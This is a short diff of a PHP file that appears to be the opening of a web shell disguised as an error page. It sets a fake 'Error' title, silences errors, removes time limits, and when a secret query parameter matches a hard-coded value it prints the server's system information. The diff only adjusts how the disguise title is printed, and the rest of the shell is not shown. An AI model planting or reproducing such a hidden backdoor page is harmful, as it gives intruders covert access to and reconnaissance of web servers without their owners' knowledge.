@@ -1,10 +1,7 @@
-<html>
-<title>Error</title>
-</html>
 <?php
 error_reporting(0);
 set_time_limit(0);
-
+echo '<title>Error</title>';
 if($_GET['xalik']=="kalix"){
 echo "<center><b>Uname:".php_uname()."<br></b>"; 
 echo '<font color="black" size="4">';
